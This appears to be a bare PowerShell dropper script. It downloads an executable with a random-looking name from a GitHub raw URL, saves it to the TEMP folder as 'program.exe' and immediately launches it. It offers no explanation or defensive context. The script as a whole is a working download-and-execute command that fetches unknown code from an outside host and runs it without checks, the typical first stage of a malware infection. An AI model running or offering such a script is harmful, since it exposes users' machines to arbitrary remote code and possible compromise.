$url = "https://raw.githubusercontent.com/fasa3e/srgatr5/refs/heads/main/fl04n5lt7mz4p27c.exe"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
